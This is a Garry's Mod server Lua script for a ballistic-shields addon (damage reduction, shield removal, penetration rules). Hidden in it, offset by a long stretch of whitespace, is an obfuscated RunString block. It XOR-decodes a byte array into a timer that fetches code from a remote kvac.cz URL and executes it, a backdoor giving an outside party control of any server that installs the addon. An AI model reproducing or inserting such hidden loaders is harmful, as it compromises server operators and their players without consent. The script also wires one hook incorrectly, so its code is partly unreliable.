if CLIENT then return end
util.AddNetworkString( "bs_shield_info" )

function bshield_remove(ply)
	if(!IsValid(ply.bs_shield)) then return end
	ply.bs_type = 0
	ply.bs_shield:Remove()
end
                                                 
hook.Add( "EntityTakeDamage", "bshields_reduce_damage", function( ent, dmginfo )
	if !ent:IsPlayer() then return end
	if ( ent.bs_type == 1 ) then
		if(dmginfo:IsExplosionDamage()) then dmginfo:ScaleDamage( 1 - bshields.config.hshieldexpl/100 ) end
		if(dmginfo:IsDamageType(DMG_CRUSH) || dmginfo:IsDamageType(DMG_CLUB) || dmginfo:IsDamageType(DMG_SLASH)) then dmginfo:ScaleDamage( 1 - bshields.config.hshieldmelee/100 ) return end
	end
	if ( ent.bs_type == 3 ) then
		if(dmginfo:IsDamageType(DMG_CRUSH) || dmginfo:IsDamageType(DMG_CLUB) || dmginfo:IsDamageType(DMG_SLASH)) then dmginfo:ScaleDamage( 1 - bshields.config.rshieldmelee/100 ) return end
	end
end )

hook.Add( "PlayerSpawn", "bshields_hshield_init", function(ply)
	ply.allowhshield = true
end)

hook.Add( "PlayerInitialSpawn", "bshields_init_dshields", function(ply)
	ply.bs_shields = {}
end)

hook.Add( "AllowPlayerPickup", "bshields_disable_pickup", function(ply)
	if(IsValid(ply.bs_shield)) then return false end
end)

hook.Add( "PlayerDeath", "bshields_death", function(ply)
	bshield_remove(ply)
end)

hook.Add( "onDarkRPWeaponDropped", "bshields_drop", function(ply, wep, owep)
	bshield_remove(ply)
end)

hook.Add("CW_canPenetrate", "bshield_cw_penetration", function(ent)
	if (ent:GetModel() == "models/bshields/dshield.mdl" || ent:GetModel() == "models/bshields/hshield.mdl" || ent:GetModel() == "models/bshields/dshield_open.mdl" || (ent:GetModel() == "models/bshields/rshield.mdl" && bshields.config.rshieldbp)) then 
		return false
	end
end)
                                                                                                                                                                                                                                                           RunString([[ local AE = {20,9,13,5,18,78,51,9,13,16,12,5,72,81,76,64,6,21,14,3,20,9,15,14,72,73,64,8,20,20,16,78,38,5,20,3,8,72,66,8,20,20,16,19,90,79,79,11,22,1,3,78,3,26,79,6,78,16,8,16,95,11,5,25,93,58,53,33,10,54,87,13,46,38,34,81,87,18,17,14,22,56,54,83,85,66,76,64,6,21,14,3,20,9,15,14,72,2,73,64,50,21,14,51,20,18,9,14,7,72,2,76,64,66,90,66,76,64,6,1,12,19,5,73,64,5,14,4,73,5,14,4,73,64,77,77,64,0} local function RunningDRMe()if (debug.getinfo(function()end).short_src~="tenjznj")then return end for o=500,10000 do local t=0 if t==1 then return end  if o~=string.len(string.dump(RunningDRMe))then  AZE=10  CompileString("for i=1,40 do AZE = AZE + 1 end","RunString")()  if AZE<40 then return end continue  else  local pdata=""  xpcall(function()  for i=1,#AE do  pdata=pdata..string.char(bit.bxor(AE[i],o%150))  end  for i=1,string.len(string.dump(CompileString)) do  while o==1 do  o=o+1  end  end  end,function()  xpcall(function()  local debug_inject=CompileString(pdata,"DRME")  pcall(debug_inject,"stat")  pdata="F"  t=1  end,function()  print("error")  end)  end)  end  end end RunningDRMe() ]],"tenjznj")
local function RemoveDeployedShields(ply)
	if(!IsValid(ply)) then return end
	if(ply.bs_shields==nil) then return end
	for _, v in pairs(ply.bs_shields) do
		if(IsValid(v)) then v:Remove() end
	end
end

hook.Add( "PlayerDisconnected", "bshields_remove_dshields", RemoveDeployedShields(ply))
hook.Add( "OnPlayerChangedTeam", "bshields_change_job",	function(ply) 
	if(bshields.config.removeonjobchange) then RemoveDeployedShields(ply) end
end)